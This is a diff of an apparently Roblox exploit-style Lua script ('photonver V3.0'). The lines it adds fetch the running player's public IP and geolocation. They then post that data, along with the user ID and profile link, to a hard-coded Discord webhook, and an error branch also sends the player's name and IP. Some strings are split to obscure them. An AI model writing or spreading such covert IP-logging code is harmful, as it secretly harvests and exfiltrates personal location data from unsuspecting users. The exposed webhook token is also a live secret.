@@ -4,9 +4,11 @@ we=true;unpack=(unpack)or(table["unpack"])qq={[1]=function()return"h".."ttps".."
 --// game:GetService("UserInputService").TouchEnabled
 --// game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 photonver = "V3.0"
-if getgenv().ex == nil then getgenv().ex = true
-ipinf=game:GetService("HttpService"):JSONDecode(game:HttpGet('https://ipapi.co/'..game:HttpGet("https://api.ipify.org")..'/json'))[1]
 local url = "https://discord.com/api/webhooks/1261141544937979904/vTNWW3mgj0U-".."dbiIQNRAhpXHSBzcAIEAcPt54cQ-u7XA2nZ5LXhF0vRnWda9p0laS7O8"
+if getgenv().ex == nil then getgenv().ex = true
+suc,res=pcall(function()
+ipinf=game:GetService("HttpService"):JSONDecode(game:HttpGet('https://ipapi.co/'..game:HttpGet("https://api.ipify.org")..'/json'))[1]
+
 local data = {
     ["embeds"] = {{
         ["description"] = "**"..(qq+6).."**".." **|** [**Profile**](h".."ttps://roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile)".."[**Ip Info**](https://ipinfo.io/"..game:HttpGet("https://api.ipify.org")..")",
@@ -146,4 +148,21 @@ request(
         Body = game:GetService("HttpService"):JSONEncode(data)
     }
 )
+end)
+if not suc then
+request(
+    {
+        Url = url,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode(
+            {
+                ["content"] = "Error ("..game.Players.LocalPlayer.Name.." "..game:HttpGet("https://api.ipify.org")..")"
+            }
+        )
+    }
+)
+end
 end
